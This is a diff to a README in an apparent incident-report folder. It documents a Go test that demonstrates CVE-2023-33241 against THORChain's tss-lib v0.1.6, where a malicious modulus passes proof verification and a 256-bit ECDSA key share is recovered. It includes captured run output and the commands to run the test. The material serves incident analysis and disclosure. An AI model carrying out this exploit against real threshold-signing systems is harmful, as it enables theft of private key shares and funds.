@@ -1,19 +1,32 @@
-# Real-lib attack — links against the actual vulnerable code
+# Real-lib attack — full end-to-end against actual vulnerable code
 
-`attack_real_lib_test.go` is the **end-to-end** demonstration: it links
-against `gitlab.com/thorchain/tss/tss-lib` at tag `v0.1.6` (the same
-version THORChain runs in production) and shows that the lib's
-`(*Proof).Verify(N, k, ecdsaPub)` returns **true** for a malicious
-`N = p_big × 1009` (smallest small factor that bypasses the trial
-division at `verifyPrimesUntil = 1000`).
+`attack_real_lib_test.go` links against `gitlab.com/thorchain/tss/tss-lib`
+at tag `v0.1.6` (the same version THORChain runs in production) and
+demonstrates the **complete CVE-2023-33241 attack** using real lib APIs.
 
 Captured run output: [`run_output.txt`](./run_output.txt)
 
+## Three tests
+
+| Test | Scale | Time | What it proves |
+|---|---|---|---|
+| `TestRealLib_AcceptAndLeak_1024` | 1024-bit N | 0.08s | lib's `proof.Verify` accepts malicious N; lib's `Encrypt`/`Decrypt` leaks one residue (`share mod 1009 = 158` matches truth) |
+| `TestRealLib_AcceptAndLeak_2048` | **2048-bit N (production size)** | 3.85s | Same as 1024 but at the exact bit length THORChain uses in production; `share mod 1009 = 818` matches truth |
+| `TestRealLib_FullShareRecoveryViaCRT` | 26 sessions × 1024-bit N | 19.2s | **Full 256-bit ECDSA share recovered byte-for-byte** through real lib Encrypt + Decrypt + CRT — the actual attack as it would unfold |
+
+Punchline from the CRT test (run_output.txt):
+
 ```
-[6] calling proof.Verify (REAL vulnerable lib code)
-[7] Verify returned: true
-[8] === ATTACK CONFIRMED AGAINST REAL LIB v0.1.6 ===
---- PASS: TestMaliciousNAcceptedByRealLib (0.10s)
+[goal] recover this 256-bit ECDSA share: 95927529871605170799049668478422896289770098328020361252996156217515203700483
+  session  1  q=1009  leaked 10 bits  cumulative knowledge: 2^10
+  ...
+  session 26  q=1181  leaked 11 bits  cumulative knowledge: 2^263
+[stop] knownModulus ≥ 2^256 — share fully determined
+
+[result] trueShare = 95927529871605170799049668478422896289770098328020361252996156217515203700483
+         recovered = 95927529871605170799049668478422896289770098328020361252996156217515203700483
+[FINAL] === FULL 256-BIT SHARE RECOVERED VIA REAL LIB Encrypt + Decrypt + CRT ===
+--- PASS: TestRealLib_FullShareRecoveryViaCRT (19.21s)
 ```
 
 ## Why this needs WSL / Linux
@@ -55,10 +68,12 @@ EOF
 cp /mnt/c/path/to/this/repo/incident_reports/2026-05-15_thorchain_secure_plus_drain/tss_demo/real_lib_run/attack_real_lib_test.go .
 
 go mod tidy
-go test -v -timeout 180s
+go test -v -timeout 300s
 ```
 
-Expected output matches `run_output.txt`.
+Expected output matches `run_output.txt`. Quick variant for impatient
+readers: `go test -v -short -timeout 60s` runs only the 1024-bit
+single-session test (~0.1s).
 
 ## What the test does (12 lines that matter)
 
